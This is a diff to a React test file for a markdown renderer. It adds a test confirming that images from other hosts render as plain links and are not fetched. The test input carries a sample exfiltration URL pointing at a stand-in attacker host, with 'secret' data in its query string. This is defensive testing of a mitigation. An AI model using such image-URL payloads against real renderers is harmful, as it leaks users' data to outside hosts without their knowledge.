@@ -472,15 +472,25 @@ Below`}
   })
 
   describe('images', () => {
-    test('bounds and lazy-loads a markdown image', () => {
-      const { container } = render(
-        <MarkdownRenderer content={'![Grundriss](https://example.org/plan.png)'} />
-      )
+    test('bounds and lazy-loads an image this origin serves', () => {
+      const { container } = render(<MarkdownRenderer content={'![Grundriss](/api/files/plan.png)'} />)
 
       const image = container.querySelector('img')
       expect(image).toHaveAttribute('loading', 'lazy')
       expect(image).toHaveAttribute('alt', 'Grundriss')
       expect(image?.className).toContain('max-w-full')
+    })
+
+    test('draws an image from another host as a link, so nothing is fetched without a click', () => {
+      const { container } = render(
+        <MarkdownRenderer content={'![Grundriss](https://attacker.test/p?d=secret) and ![](//evil.test/x.png)'} />
+      )
+
+      expect(container.querySelector('img')).toBeNull()
+      const links = container.querySelectorAll('a')
+      expect(links[0]).toHaveAttribute('href', 'https://attacker.test/p?d=secret')
+      expect(links[0]).toHaveTextContent('Grundriss')
+      expect(links[1]).toHaveAttribute('href', '//evil.test/x.png')
     })
   })
 
